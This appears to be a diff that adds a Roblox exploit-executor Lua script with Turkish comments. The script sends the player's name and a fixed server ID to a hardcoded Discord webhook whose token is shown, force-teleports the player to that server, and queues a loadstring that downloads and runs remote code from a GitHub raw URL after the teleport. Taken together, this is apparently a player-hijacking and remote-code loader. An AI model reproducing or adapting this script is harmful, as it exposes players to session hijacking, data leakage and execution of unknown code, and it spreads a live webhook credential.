@@ -1,1 +1,72 @@
+-- ✅ Tek sefer çalıştırma kontrolü
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
 
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local plr = Players.LocalPlayer
+
+-- ✅ Webhook URL
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1407545253342482502/Hf7jtvsT7qFGaD4WIRt-Jg-ObkKUJ3__Vp1xpzZ3sQKUXbaecioGYZopVqii5P1n9iGn"
+
+-- ✅ Fixed PlaceId and JobId
+local PLACE_ID = 142823291
+local JOB_ID = "4ea7a4f6-1af4-41a4-b9fa-0cdf7b0e4556"
+
+-- ✅ Universal request (executor uyumlu)
+local req = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request) or request
+if not req then warn("Request function bulunamadi!") return end
+
+-- 🔹 Debug mesajı
+req({
+    Url = WEBHOOK_URL,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = HttpService:JSONEncode({content = "🤖 Bot başlatıldı, fixed server'a teleport ediliyor..."})
+})
+
+-- 🔹 Queue function for different executors
+local queue_func = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport) or function(code) warn("Queue on teleport not supported in this executor!") end
+
+-- 🔹 Teleport ve webhook işlemi
+spawn(function()
+    local joinLink = string.format("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s", PLACE_ID, JOB_ID)
+    local robloxCode = string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")", PLACE_ID, JOB_ID)
+            
+    -- Webhook payload
+    local payload = {
+        content = robloxCode,
+        embeds = {{
+            title = "🔗 Tap to Join",
+            description = string.format("[Join Server Here](%s)\n**Player:** %s\n**PlaceId:** %s\n**ServerId:** %s", joinLink, plr.Name, PLACE_ID, JOB_ID),
+            color = 5814783
+        }}
+    }
+            
+    req({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
+            
+    -- 🔹 Teleport sonrası pastefy script
+    queue_func([[
+        local player = game:GetService("Players").LocalPlayer
+        if not player.Character then
+            player.CharacterAdded:Wait()
+        end
+        task.wait(1)  -- Ekstra bekleme süresi ekleyin
+        task.spawn(function()
+            print("✅ Teleport sonrası kod inject oldu, pastefy script yükleniyor...")
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/mm2scripthub/mm2/refs/heads/main/newscript'))()
+        end)
+    ]])
+            
+    -- 🚀 Teleport
+    TeleportService:TeleportToPlaceInstance(PLACE_ID, JOB_ID, plr)
+end)
